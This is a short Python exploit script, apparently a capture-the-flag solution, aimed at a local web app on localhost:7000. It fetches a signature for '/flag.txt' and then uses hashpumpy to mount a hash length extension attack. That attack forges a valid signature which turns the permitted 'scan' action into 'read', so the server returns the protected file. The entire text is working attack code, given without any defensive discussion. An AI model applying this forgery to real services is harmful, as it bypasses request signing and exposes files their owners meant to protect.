import requests
import hashpumpy
url = "http://localhost:7000/index.php"

getsign = "http://localhost:7000/getsign.php"

def readsign():
    r = requests.get(getsign,params={'param':'/flag.txt'})
    #print r.text
    sign = r.text[:-2]
    params = {
        'filename':'/flag.txt',
        'sign': sign,
        'action':'scan'
    }
    r = requests.get(url,params=params)
    return sign


def exp(sign):
    has = hashpumpy.hashpump(sign,'scan','read',39)
    sign = has[0]
    action = has[1]
    params = {
        'sign':sign,
        'action': action,
        'filename': '/flag.txt'
    }
    r = requests.get(url,params=params)
    print r.text

exp(readsign())
